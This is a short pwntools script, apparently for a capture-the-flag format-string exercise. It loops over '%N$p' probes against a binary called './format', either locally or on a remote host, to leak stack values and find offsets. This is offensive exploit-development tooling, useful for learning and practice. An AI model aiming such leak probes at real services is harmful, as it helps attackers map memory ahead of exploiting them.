from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './format'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

io = start(level='error')

# Let's fuzz x values
for i in range(100):
    try:
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        io.sendline('%{}$p'.format(i).encode())
        # Receive the response
        result = io.recvline()
        print(str(i) + ': ' + str(result))
    except EOFError:
        pass

# Keep connection open so we can address mapping in GDB
io.interactive()
